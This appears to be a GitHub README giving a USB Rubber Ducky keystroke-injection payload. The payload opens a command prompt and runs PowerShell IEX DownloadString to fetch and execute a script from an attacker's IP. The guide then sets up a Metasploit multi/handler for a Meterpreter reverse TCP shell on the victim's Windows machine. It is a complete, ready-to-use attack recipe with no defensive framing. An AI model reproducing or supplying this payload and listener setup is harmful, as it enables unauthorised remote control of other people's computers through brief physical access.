* Author - Ujjwal Thakran

* When You insert the ducky it will run a Powershell download command from which you can use you Kali linux or If you have Metasploit properly installed than also you mac or other Linux Distros to create a meterpeter session with the target computer

* Alternative to [Payload Reverse Shell](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---reverse-shell)

1. Encode your usb rubber Ducky with the Following


```
REM Replace the Site/IP address with you Kali linux IP Address
DELAY 800
GUI r
DELAY 800
STRING cmd
DELAY 300
ENTER
DELAY 300
STRING powershell IEX (New-Object Net.WebClient).DownloadString('(Site/IP address)/powershell.ps1')
DELAY 300
ENTER
```



#### I suggest using [Ducky Encoder](https://ducktoolkit.com/encoder/) for this Payload 

2. Create a PowerShell Meterpreter reverse TCP payload and Place it on your Host Computer 
#### Use This to create the Payload [Powershell Payload generator](https://github.com/b00stfr3ak/Powershell-Reverse-Rubber-Ducky))

Here is the Powershell Payload I generated for My IP

#### [Payload Link](https://pastebin.com/c7xrRCY9)

3. Fire up MSFCONSOLE and start the listener:



```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST (Your IP)
set LPORT (Your PORT #)
run
```




4. Insert the USB rubber ducky in and wait for the magic to happen

##### And Thats It folks You can run custom


```
Shell
```


#### After that


* ###### Contact Me on Github or Email me at (ujjwalthakran@hotmail.com) For Edit or help Thanks
